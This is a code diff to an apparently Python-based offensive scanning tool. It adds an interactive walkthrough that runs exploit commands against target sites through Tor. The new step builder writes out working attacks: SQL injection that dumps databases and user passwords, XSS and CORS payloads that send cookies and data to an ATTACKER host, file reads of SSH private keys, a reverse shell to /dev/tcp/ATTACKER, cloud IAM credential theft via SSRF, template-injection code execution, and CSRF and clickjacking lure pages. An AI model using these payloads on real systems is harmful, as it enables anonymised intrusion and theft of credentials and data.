@@ -960,51 +960,58 @@ def flow_testnet(detected_port=None):
                        "Paranoia dry-run")
 
 
-def _intel_exploit_walkthrough(tor_proxy: str):
-    """Interactive walkthrough of exploitable findings from the latest scan.
+def _load_latest_report(ram_dir: Path) -> Optional[dict]:
+    """Load the most recent intel report, handling decryption if needed."""
+    reports = sorted(ram_dir.glob("intel_*"), key=lambda f: f.stat().st_mtime, reverse=True)
+    if not reports:
+        return None
+    latest = reports[0]
 
-    Reads the most recent report from RAM storage, presents each exploitable
-    finding, and offers to re-run the exploit payload for verification.
+    if latest.suffix == ".enc":
+        try:
+            from cryptography.fernet import Fernet as _F
+        except ImportError:
+            err("cryptography package needed to read encrypted reports.")
+            return None
+        import getpass as _gp
+        key = _gp.getpass("  Enter decryption key: ")
+        if not key:
+            return None
+        try:
+            cipher = _F(key.encode() if isinstance(key, str) else key)
+            return json.loads(cipher.decrypt(latest.read_bytes()))
+        except Exception:
+            err("Decryption failed — wrong key or corrupt file.")
+            return None
+    else:
+        try:
+            return json.loads(latest.read_text())
+        except (json.JSONDecodeError, OSError):
+            err("Cannot read report file.")
+            return None
+
+
+def _intel_exploit_walkthrough(tor_proxy: str):
+    """Interactive step-by-step exploit walkthrough with execution support.
+
+    For each exploitable finding:
+    - Shows the vulnerability details and impact
+    - Presents multi-step PoC with individual step confirmation
+    - Allows custom parameter input for each step
+    - Executes commands through Tor with safety confirmations
+    - Tracks which steps have been completed
     """
-    import glob as _glob
+    import time as _t
+
     ram_dir = Path("/dev/shm/intel") if Path("/dev/shm/intel").exists() else ROOT / ".intel_tmp"
     if not ram_dir.exists():
         info("No scan results found. Run a scan first.")
         return
 
-    # Find most recent report (encrypted or plain)
-    reports = sorted(ram_dir.glob("intel_*"), key=lambda f: f.stat().st_mtime, reverse=True)
-    if not reports:
+    report_data = _load_latest_report(ram_dir)
+    if not report_data:
         info("No scan results found. Run a scan first.")
         return
-
-    latest = reports[0]
-    report_data = None
-
-    if latest.suffix == ".enc":
-        # Need decryption key
-        try:
-            from cryptography.fernet import Fernet as _F
-        except ImportError:
-            err("cryptography package needed to read encrypted reports.")
-            return
-        import getpass as _gp
-        key = _gp.getpass("  Enter decryption key: ")
-        if not key:
-            return
-        try:
-            cipher = _F(key.encode() if isinstance(key, str) else key)
-            decrypted = cipher.decrypt(latest.read_bytes())
-            report_data = json.loads(decrypted)
-        except Exception:
-            err("Decryption failed — wrong key or corrupt file.")
-            return
-    else:
-        try:
-            report_data = json.loads(latest.read_text())
-        except (json.JSONDecodeError, OSError):
-            err("Cannot read report file.")
-            return
 
     vulns = report_data.get("vulnerabilities", [])
     exploitable = [v for v in vulns if v.get("exploitable")]
@@ -1014,158 +1021,353 @@ def _intel_exploit_walkthrough(tor_proxy: str):
         info(f"Total findings: {len(vulns)}")
         return
 
+    # Extract base URL for building commands
+    base_url = _extract_base_url_from_vulns(vulns) or "[TARGET]"
+    _proxy_port = urlparse(tor_proxy).port or 9050
+    _sp = f"--socks5-hostname 127.0.0.1:{_proxy_port}"
+
     heading("Exploit Walkthrough")
-    print(f"  Found {len(exploitable)} exploitable vulnerabilities.")
-    print(f"  Walk through each one? You can choose to verify each exploit.")
+    print(f"  {B}{len(exploitable)}{N} exploitable vulnerabilities found.")
+    print(f"  Base URL: {B}{base_url}{N}")
     print()
 
+    # Sort by severity: CRITICAL first
+    sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
+    exploitable.sort(key=lambda v: sev_order.get(v.get("severity", ""), 5))
+
+    # Show summary table first
+    print(f"  {'#':>3}  {'Sev':8}  {'Type':20}  Title")
+    print(f"  {'─' * 70}")
     for i, v in enumerate(exploitable):
+        sev = v.get("severity", "?")
+        etype = v.get("exploit_info", {}).get("type", "?")
+        color = {"CRITICAL": R, "HIGH": R, "MEDIUM": Y, "LOW": C}.get(sev, D)
+        print(f"  {i+1:>3}  {color}[{sev:6}]{N}  {etype:20}  {v.get('title', '?')[:45]}")
+    print()
+
+    sel = prompt("Enter number to explore (or 'all' for sequential, 'q' to quit)", "all")
+    if sel.lower() in ("q", "quit"):
+        return
+
+    if sel.isdigit():
+        idx = int(sel) - 1
+        if 0 <= idx < len(exploitable):
+            targets = [exploitable[idx]]
+        else:
+            err(f"Invalid number: {sel}")
+            return
+    else:
+        targets = exploitable
+
+    for vi, v in enumerate(targets):
         if shutdown_requested():
             break
+
         sev = v.get("severity", "?")
         color = {"CRITICAL": R, "HIGH": R, "MEDIUM": Y, "LOW": C}.get(sev, D)
         conf = v.get("confidence", 0)
-
-        print(f"\n  {'─' * 55}")
-        print(f"  {color}[{sev}]{N} {v['title']} ({conf*100:.0f}% confidence)")
-        print(f"  {'─' * 55}")
-        print(f"  {B}Detail:{N} {v.get('detail', 'N/A')}")
-
         ei = v.get("exploit_info", {})
-        if ei:
-            print(f"  {B}Type:{N}   {ei.get('type', 'unknown')}")
-            print(f"  {B}Method:{N} {ei.get('method', 'N/A')}")
-            print(f"  {B}Risk:{N}   {ei.get('risk', 'N/A')}")
+        etype = ei.get("type", "unknown")
+        param = ei.get("parameter", "")
+        test_url = v.get("test_url", base_url)
 
-        print(f"  {B}Evidence:{N} {v.get('evidence', 'N/A')}")
+        # ── Finding Header ──
+        print(f"\n  {'═' * 65}")
+        print(f"  {color}[{sev}]{N} {B}{v.get('title', '?')}{N}")
+        print(f"  {'═' * 65}")
+        print(f"  {B}Type:{N}       {etype}")
+        print(f"  {B}Confidence:{N} {conf*100:.0f}%")
+        print(f"  {B}Detail:{N}     {v.get('detail', 'N/A')[:200]}")
+        if ei.get("risk"):
+            print(f"  {B}Risk:{N}       {ei['risk']}")
+        if v.get("evidence"):
+            print(f"  {B}Evidence:{N}   {v['evidence'][:150]}")
+        if test_url and test_url != "[TARGET]":
+            print(f"  {B}Test URL:{N}   {test_url}")
         print()
 
-        # Show PoC command — use operator's proxy port, not hardcoded 9050
-        _proxy_port = urlparse(tor_proxy).port or 9050
-        _sp = f"--socks5-hostname 127.0.0.1:{_proxy_port}"
-        poc = v.get("poc_curl", "")
-        if not poc and ei:
-            from urllib.parse import quote as _q
-            etype = ei.get("type", "")
-            param = ei.get("parameter", "")
-            path_info = ei.get("path", "")
-            if etype == "sqli" and param:
-                poc = f'curl {_sp} "[TARGET]?{param}=1\'"'
-            elif etype == "xss" and param:
-                poc = f'curl {_sp} "[TARGET]?{param}=<script>alert(1)</script>"'
-            elif etype == "lfi" and param:
-                poc = f'curl {_sp} "[TARGET]?{param}=..%2F..%2F..%2Fetc%2Fpasswd"'
-            elif etype == "command_injection" and param:
-                poc = f'curl {_sp} "[TARGET]?{param}=;id"'
-            elif etype == "graphql_introspection" and path_info:
-                poc = (f'curl {_sp} -X POST '
-                       f'-H "Content-Type: application/json" '
-                       f'-d \'{{ "query": "{{ __schema {{ types {{ name }} }} }}" }}\' '
-                       f'"[TARGET]{path_info}"')
-            elif etype == "ssti" and param:
-                poc = f'curl {_sp} "[TARGET]?{param}={{{{7*7}}}}"'
-            elif etype == "crlf" and param:
-                poc = f'curl -v {_sp} "[TARGET]?{param}=%0d%0aSet-Cookie:%20pwned=1"'
-            elif etype == "csrf":
-                poc = f'<form method="POST" action="[TARGET]"><input name="{param}" value="evil"></form>'
-            elif etype == "idor" and param:
-                poc = f'for i in $(seq 1 20); do curl -s {_sp} "[TARGET]?{param}=$i"; done'
-            elif etype == "clickjacking":
-                poc = '<iframe src="[TARGET]" style="opacity:0;width:100%;height:100%"></iframe>'
-            elif etype == "cors_misconfiguration":
-                poc = f'curl -v {_sp} -H "Origin: https://evil.com" "[TARGET]"'
-            elif etype == "csp_bypass":
-                poc = "# CSP allows unsafe-inline/eval — any XSS vector will execute"
-            elif etype == "stored_xss" and param:
-                rp = ei.get("render_path", "/")
-                poc = f'curl {_sp} -d "{param}=<script>alert(1)</script>" "[TARGET]{path_info}"\ncurl {_sp} "[TARGET]{rp}"'
-            elif etype == "ssrf" and param:
-                poc = f'curl {_sp} "[TARGET]?{param}=http://169.254.169.254/latest/meta-data/"'
+        # ── Build Steps ──
+        steps = _build_exploit_steps(etype, param, ei, test_url, base_url, _sp)
 
-        if poc:
-            print(f"  {B}PoC:{N}")
-            print(f"    {D}{poc}{N}")
+        # ── Step-by-Step Execution ──
+        print(f"  {B}Exploitation Steps ({len(steps)}):{N}")
         print()
 
-        while True:
-            print(f"  Options:")
-            print(f"    {G}y{N} — verify this exploit (re-sends payload through new Tor circuit)")
-            print(f"    {G}p{N} — show full PoC details")
-            print(f"    {G}n{N} — skip to next finding")
-            print(f"    {G}q{N} — quit walkthrough")
+        step_idx = 0
+        while step_idx < len(steps):
+            if shutdown_requested():
+                break
+            step = steps[step_idx]
+            step_num = step_idx + 1
+
+            print(f"  {G}Step {step_num}/{len(steps)}{N}: {B}{step['title']}{N}")
+            if step.get("warning"):
+                print(f"  {R}WARNING: {step['warning']}{N}")
+            print(f"  {D}Command:{N}")
+            for cmd_line in step["command"].split("\n"):
+                print(f"    {C}{cmd_line}{N}")
+            if step.get("note"):
+                print(f"  {D}Note: {step['note']}{N}")
             print()
-            choice = prompt(f"  [{i+1}/{len(exploitable)}] Choose", "n").lower()
 
-            if choice == "p":
-                print(f"\n  {B}Full PoC Details:{N}")
-                if ei.get("method"):
-                    print(f"  Method: {ei['method']}")
-                if ei.get("risk"):
-                    print(f"  Risk: {ei['risk']}")
-                if poc:
-                    for _poc_line in poc.split("\n"):
-                        print(f"  {_poc_line}")
-                if ei.get("render_path"):
-                    print(f"  Render path: {ei['render_path']}")
-                if ei.get("xss_context"):
-                    print(f"  XSS context: {ei['xss_context']}")
-                print()
-                continue  # Re-prompt on same finding
-            break  # Any other choice exits the inner loop
+            while True:
+                print(f"    {G}r{N}=run  {G}e{N}=edit+run  {G}s{N}=skip step  "
+                      f"{G}n{N}=next finding  {G}q{N}=quit")
+                action = prompt(f"  Step {step_num}", "s").lower()
 
-        if choice == "q":
-            info("Walkthrough ended.")
-            break
+                if action in ("q", "quit"):
+                    info("Walkthrough ended.")
+                    return
 
-        if choice in ("y", "yes"):
-            # Rate limiting: enforce delay between replay attempts
-            import time as _t
-            info("Rotating Tor circuit before replay...")
-            _t.sleep(3 + secrets.randbelow(4))
+                if action in ("n", "next"):
+                    break
 
-            if not confirm("CONFIRM: Send exploit payload to target?"):
-                info("Skipped.")
+                if action in ("s", "skip"):
+                    info(f"Skipped step {step_num}")
+                    step_idx += 1
+                    break
+
+                if action in ("r", "run"):
+                    if step.get("warning"):
+                        if not confirm(f"  {step['warning']} Proceed?"):
+                            info("Aborted.")
+                            continue
+
+                    cmd = step["command"]
+                    if cmd.startswith("#") or cmd.startswith("<!--"):
+                        info("This step is informational — copy the code manually.")
+                        step_idx += 1
+                        break
+
+                    info(f"Rotating Tor circuit...")
+                    _t.sleep(1 + secrets.randbelow(3))
+
+                    if not confirm("CONFIRM: Execute this command through Tor?"):
+                        info("Aborted.")
+                        continue
+
+                    try:
+                        result = subprocess.run(
+                            ["bash", "-c", cmd],
+                            capture_output=True, text=True, timeout=30,
+                        )
+                        if result.stdout:
+                            print(f"\n  {G}Output:{N}")
+                            for line in result.stdout.strip().split("\n")[:20]:
+                                print(f"    {line}")
+                        if result.stderr:
+                            print(f"\n  {Y}Stderr:{N}")
+                            for line in result.stderr.strip().split("\n")[:5]:
+                                print(f"    {line}")
+                        ok(f"Step {step_num} executed (exit code: {result.returncode})")
+                    except subprocess.TimeoutExpired:
+                        warn("Command timed out (30s)")
+                    except Exception as e:
+                        err(f"Execution failed: {type(e).__name__}")
+                    print()
+                    step_idx += 1
+                    break
+
+                if action in ("e", "edit"):
+                    custom = prompt("Enter custom command (or Enter to keep original)",
+                                    step["command"].split("\n")[0])
+                    if custom:
+                        if not confirm(f"Execute: {custom[:80]}... ?"):
+                            continue
+                        try:
+                            result = subprocess.run(
+                                ["bash", "-c", custom],
+                                capture_output=True, text=True, timeout=30,
+                            )
+                            if result.stdout:
+                                print(f"\n  {G}Output:{N}")
+                                for line in result.stdout.strip().split("\n")[:20]:
+                                    print(f"    {line}")
+                            ok(f"Custom command executed")
+                        except subprocess.TimeoutExpired:
+                            warn("Command timed out (30s)")
+                        except Exception as e:
+                            err(f"Execution failed: {type(e).__name__}")
+                    step_idx += 1
+                    break
+
+            if action in ("n", "next"):
                 continue
 
-            exploit_type = ei.get("type", "")
-            param = ei.get("parameter", "")
-            path_info = ei.get("path", "")
-
-            info(f"Re-verifying {exploit_type}...")
-
-            # Build verification URL
-            base = _extract_base_url_from_vulns(vulns)
-            verify_url = None
-            if exploit_type == "sqli" and param and base:
-                verify_url = f"{base}?{param}=1'"
-            elif exploit_type == "xss" and param and base:
-                canary = f"xss{secrets.token_hex(4)}test"
-                verify_url = f"{base}?{param}=<{canary}>"
-            elif exploit_type == "lfi" and param and base:
-                verify_url = f"{base}?{param}=..%2F..%2F..%2Fetc%2Fpasswd"
-            elif exploit_type == "command_injection" and param and base:
-                marker = f"gs{secrets.token_hex(4)}verify"
-                verify_url = f"{base}?{param}=;echo {marker}"
-            elif exploit_type == "graphql_introspection" and path_info and base:
-                verify_url = base.rstrip("/") + path_info
-            elif exploit_type == "ssrf" and param and base:
-                verify_url = f"{base}?{param}=http://169.254.169.254/latest/meta-data/"
-
-            if verify_url:
-                verify_args = ["--domain", urlparse(verify_url).netloc,
-                               "--scan", "quick", "--tor-proxy", tor_proxy]
-                info("Running verification...")
-                run_script(INTEL / "testergatherSystem", verify_args, "Verify")
-                ok("Verification complete — check output above.")
-            else:
-                info(f"Cannot auto-verify {exploit_type}. Use the PoC command manually.")
-
-            # Rate limit: wait between replays
-            _t.sleep(2 + secrets.randbelow(3))
+        if len(targets) > 1 and vi < len(targets) - 1:
+            print()
+            if not confirm("Continue to next finding?"):
+                break
 
     print()
     ok("Exploit walkthrough complete.")
     info("Run option 9 (Paranoia Cleanup) when done.")
+
+
+def _build_exploit_steps(etype: str, param: str, ei: dict,
+                         test_url: str, base_url: str, sp: str) -> list:
+    """Build actionable step-by-step exploit commands for a finding."""
+    target = test_url if test_url and test_url != "[TARGET]" else base_url
+    path = ei.get("path", "")
+    steps = []
+
+    if etype == "sqli":
+        steps = [
+            {"title": "Confirm SQL injection",
+             "command": f"curl -s {sp} \"{target}\"",
+             "note": "Look for SQL error messages in the response"},
+            {"title": "Extract database version",
+             "command": f"curl -s {sp} \"{target.split('?')[0]}?{param}=' UNION SELECT version()-- -\"",
+             "note": "Response should contain the DB version string"},
+            {"title": "List all databases",
+             "command": f"curl -s {sp} \"{target.split('?')[0]}?{param}=' UNION SELECT group_concat(schema_name) FROM information_schema.schemata-- -\"",
+             "warning": "This queries the target database"},
+            {"title": "List tables in current database",
+             "command": f"curl -s {sp} \"{target.split('?')[0]}?{param}=' UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()-- -\"",
+             "warning": "This enumerates database tables"},
+            {"title": "Extract credentials (example)",
+             "command": f"curl -s {sp} \"{target.split('?')[0]}?{param}=' UNION SELECT group_concat(username,0x3a,password) FROM users-- -\"",
+             "warning": "This attempts to read user credentials"},
+        ]
+    elif etype == "xss":
+        steps = [
+            {"title": "Confirm reflection",
+             "command": f"curl -s {sp} \"{target}\" | grep -i 'alert\\|<script'",
+             "note": "Check if payload appears unescaped"},
+            {"title": "Cookie stealing payload",
+             "command": f"curl -s {sp} \"{target.split('?')[0]}?{param}=<script>new Image().src='https://ATTACKER/c?c='+document.cookie</script>\"",
+             "note": "Replace ATTACKER with your listener. Steals victim session.",
+             "warning": "This sends a payload that would steal cookies"},
+        ]
+    elif etype == "stored_xss":
+        render = ei.get("render_path", "/")
+        steps = [
+            {"title": "Inject persistent payload",
+             "command": f"curl -s {sp} -X POST -d \"{param}=<script>document.location='https://ATTACKER/c?c='+document.cookie</script>\" \"{target}\"",
+             "warning": "This injects a persistent payload into the application"},
+            {"title": "Verify payload persists",
+             "command": f"curl -s {sp} \"{base_url.rstrip('/')}{render}\" | grep -i 'ATTACKER\\|script'",
+             "note": "Check if the payload appears on the render page"},
+        ]
+    elif etype == "lfi":
+        steps = [
+            {"title": "Read /etc/passwd",
+             "command": f"curl -s {sp} \"{target}\"",
+             "note": "Look for root:x:0:0: in output"},
+            {"title": "Read application config",
+             "command": f"curl -s {sp} \"{target.split('?')[0]}?{param}=../../../var/www/html/config.php\""},
+            {"title": "Read source via PHP filter",
+             "command": f"curl -s {sp} \"{target.split('?')[0]}?{param}=php://filter/convert.base64-encode/resource=index\" | base64 -d",
+             "note": "Decodes PHP source code"},
+            {"title": "Read SSH private key",
+             "command": f"curl -s {sp} \"{target.split('?')[0]}?{param}=../../../root/.ssh/id_rsa\"",
+             "warning": "Attempts to read server SSH key"},
+        ]
+    elif etype == "command_injection":
+        steps = [
+            {"title": "Confirm command execution",
+             "command": f"curl -s {sp} \"{target}\"",
+             "note": "Look for command output (uid=, whoami result)"},
+            {"title": "Read /etc/passwd",
+             "command": f"curl -s {sp} \"{target.split('?')[0]}?{param}=;cat /etc/passwd\""},
+            {"title": "Get reverse shell (example)",
+             "command": f"# curl -s {sp} \"{target.split('?')[0]}?{param}=;bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'\"",
+             "warning": "This would open a reverse shell. Replace ATTACKER/4444.",
+             "note": "Set up listener first: nc -lvnp 4444"},
+        ]
+    elif etype == "ssrf":
+        steps = [
+            {"title": "Read cloud metadata",
+             "command": f"curl -s {sp} \"{target}\"",
+             "note": "Look for ami-id, instance-id, security-credentials"},
+            {"title": "Read IAM credentials",
+             "command": f"curl -s {sp} \"{target.split('?')[0]}?{param}=http://169.254.169.254/latest/meta-data/iam/security-credentials/\"",
+             "warning": "This reads cloud IAM credentials"},
+            {"title": "Scan internal network",
+             "command": f"curl -s {sp} \"{target.split('?')[0]}?{param}=http://192.168.1.1/\"",
+             "note": "Probe internal hosts/services"},
+        ]
+    elif etype == "ssti":
+        steps = [
+            {"title": "Confirm template evaluation",
+             "command": f"curl -s {sp} \"{target.split('?')[0]}?{param}={{{{7*7}}}}\" | grep 49",
+             "note": "49 in response = server evaluated the expression"},
+            {"title": "Read /etc/passwd (Jinja2)",
+             "command": f"curl -s {sp} \"{target.split('?')[0]}?{param}={{{{''.__class__.__mro__[1].__subclasses__()}}}}\"",
+             "note": "Lists available Python classes for RCE chain"},
+            {"title": "Execute OS command (Jinja2)",
+             "command": f"# curl -s {sp} \"{target.split('?')[0]}?{param}={{{{config.__class__.__init__.__globals__['os'].popen('id').read()}}}}\"",
+             "warning": "This executes OS commands on the server"},
+        ]
+    elif etype == "csrf":
+        steps = [
+            {"title": "Generate CSRF exploit page",
+             "command": f"# Save as exploit.html and host it:\n"
+                        f"# <html><body>\n"
+                        f"# <form method='POST' action='{target}' id='f'>\n"
+                        f"#   <input type='hidden' name='{param}' value='attacker_value'>\n"
+                        f"# </form>\n"
+                        f"# <script>document.getElementById('f').submit();</script>\n"
+                        f"# </body></html>",
+             "note": "Victim visits this page -> form auto-submits with their session"},
+        ]
+    elif etype == "idor":
+        steps = [
+            {"title": "Enumerate accessible resources",
+             "command": f"for i in $(seq 1 20); do echo \"=== ID $i ===\"; curl -s {sp} \"{target.split('?')[0]}?{param}=$i\" | head -3; echo; done",
+             "note": "Compare responses — different content per ID = confirmed IDOR"},
+        ]
+    elif etype == "clickjacking":
+        steps = [
+            {"title": "Generate clickjacking exploit page",
+             "command": f"# Save as clickjack.html:\n"
+                        f"# <html><body style='margin:0'>\n"
+                        f"# <iframe src='{target}' style='opacity:0.0001;position:absolute;width:100%;height:100%;z-index:2'></iframe>\n"
+                        f"# <div style='z-index:1;padding:50px'><h1>Click to claim your prize!</h1>\n"
+                        f"# <button style='font-size:24px;padding:20px'>CLAIM NOW</button></div>\n"
+                        f"# </body></html>",
+             "note": "Victim clicks the fake button but actually clicks the hidden target page"},
+        ]
+    elif etype == "cors_misconfiguration":
+        steps = [
+            {"title": "Verify CORS reflects arbitrary origin",
+             "command": f"curl -v {sp} -H \"Origin: https://evil.com\" \"{target}\" 2>&1 | grep -i 'access-control'",
+             "note": "Look for Access-Control-Allow-Origin: https://evil.com"},
+            {"title": "Exploit: steal authenticated data",
+             "command": f"# Host on attacker.com:\n"
+                        f"# <script>fetch('{target}',{{credentials:'include'}}).then(r=>r.text()).then(d=>fetch('https://ATTACKER/collect',{{method:'POST',body:d}}))</script>",
+             "warning": "This steals authenticated API responses cross-origin"},
+        ]
+    elif etype == "csp_bypass":
+        steps = [
+            {"title": "CSP misconfiguration details",
+             "command": f"curl -s {sp} -I \"{target}\" | grep -i 'content-security-policy'",
+             "note": "unsafe-inline allows <script> tags. unsafe-eval allows eval(). "
+                     "Find any XSS vector and it will execute despite CSP."},
+        ]
+    elif etype == "crlf":
+        steps = [
+            {"title": "Inject HTTP header",
+             "command": f"curl -v {sp} \"{target.split('?')[0]}?{param}=%0d%0aSet-Cookie:%20session=hijacked\"",
+             "note": "Check response headers for injected Set-Cookie"},
+            {"title": "Response splitting (XSS via header)",
+             "command": f"curl -v {sp} \"{target.split('?')[0]}?{param}=%0d%0a%0d%0a<script>alert(1)</script>\"",
+             "warning": "This attempts HTTP response splitting"},
+        ]
+    elif etype == "open_redirect":
+        steps = [
+            {"title": "Confirm redirect to external domain",
+             "command": f"curl -v {sp} \"{target}\" 2>&1 | grep -i 'location'",
+             "note": "Location header should point to evil domain"},
+        ]
+    else:
+        steps = [
+            {"title": f"Manual verification for {etype}",
+             "command": f"# Evidence: {ei.get('method', 'See report for details')[:100]}",
+             "note": "Follow the exploit method described above"},
+        ]
+
+    return steps
 
 
 def _extract_base_url_from_vulns(vulns: list) -> str:
